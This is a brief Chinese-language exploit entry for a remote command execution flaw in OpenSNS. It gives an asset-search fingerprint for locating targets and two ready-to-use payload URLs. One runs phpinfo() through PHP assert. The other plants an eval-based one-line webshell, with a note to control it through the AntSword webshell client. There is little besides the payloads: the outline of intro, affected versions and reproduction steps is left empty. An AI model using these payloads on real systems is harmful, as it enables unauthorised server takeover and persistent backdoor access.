# OpenSNS远程命令执行漏洞

- **系统**：OpenSNS　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="OpenSNS"`

**请求体 / payload**
```
/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule->_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=phpinfo()
使用一句话木马并采用蚁剑连接
/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=@eval($_POST[Haaa])
```

**其他**
- OpenSNS远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * opensns